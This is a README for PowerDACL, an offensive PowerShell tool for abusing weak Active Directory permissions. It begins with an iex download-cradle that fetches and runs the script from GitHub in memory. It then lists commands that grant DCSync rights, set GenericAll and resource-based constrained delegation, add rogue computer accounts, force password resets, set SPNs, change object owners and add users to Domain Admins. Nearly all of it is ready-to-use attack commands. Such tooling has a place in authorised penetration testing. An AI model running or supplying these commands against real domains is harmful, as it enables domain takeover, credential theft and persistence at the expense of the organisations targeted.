# PowerDACL
A tool to abuse weak permissions of Active Directory Discretionary Access Control Lists (DACLs) and Access Control Entries (ACEs)

## Load PowerDACL in memory

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/PowerDACL/main/PowerDACL.ps1')
```

## Help Page
```
PowerDACL
```

## Grant DCSync rights
```
DCSync -Target username
```
```
DCSync -Target username -TargetDomain userdomain
```

## Grant GenericAll rights
```
GenericAll -Target MSSQL01$ -Grantee username
```
```
GenericAll -Target MSSQL01$ -TargetDomain acme.local -Grantee username -GranteeDomain domain.local
```

## Set RBCD:
```
RBCD -Target MSSQL01$ -Grantee username
```
```
RBCD -Target MSSQL01$ -TargetDomain domain.local -Grantee username -GranteeDomain acme.local
```
```
RBCD -Target MSSQL01$ -Clear
```

## Add Computer to domain
```
AddComputer -ComputerName evilcomputer -Password P@ssw0rd!
```
```
AddComputer -ComputerName evilcomputer -Password P@ssw0rd! -Domain ferrari.local
```

## Delete Computer from domain
```
DeleteComputer -ComputerName evilcomputer
```
```
DeleteComputer -ComputerName evilcomputer -Domain ferrari.local
```

## Force Change Password
```
ForceChangePass -Target username -Password P@ssw0rd!
```
```
ForceChangePass -Target username -Password P@ssw0rd! -TargetDomain usserdomain
```

## Set SPN:
```
SetSPN -Target username
```
```
SetSPN -Target username -TargetDomain userdomain -SPN "test/test"
```

## Remove SPN:
```
RemoveSPN -Target username
```
```
RemoveSPN -Target username -TargetDomain userdomain
```

## Set Owner
```
SetOwner -Target MSSQL01$ -Owner username
```
```
SetOwner -Target MSSQL01$ -TargetDomain acme.local -Owner username -OwnerDomain domain.local
```

## Enable Account
```
EnableAccount -Target myComputer$
```
```
EnableAccount -Target myComputer$ -Domain userdomain
```

## Disable Account
```
DisableAccount -Target myComputer$
```
```
DisableAccount -Target myComputer$ -Domain userdomain
```

## Add object to a group
```
AddToGroup -Target user -Group "Domain Admins"
```
```
AddToGroup -Target user -Group "Domain Admins" -Domain userdomain
```

## Remove object from a group
```
RemoveFromGroup -Target user -Group "Domain Admins"
```
```
RemoveFromGroup -Target user -Group "Domain Admins" -Domain userdomain
```

## Modify or clear a property for an object
```
Set-DomainObject -Identity user -Set @{'userprincipalname' = "user@domain.com"}
```
```
Set-DomainObject -Identity user -Clear 'userprincipalname'
```

## Shadow Credentials

https://github.com/Leo4j/KeyCredentialLink
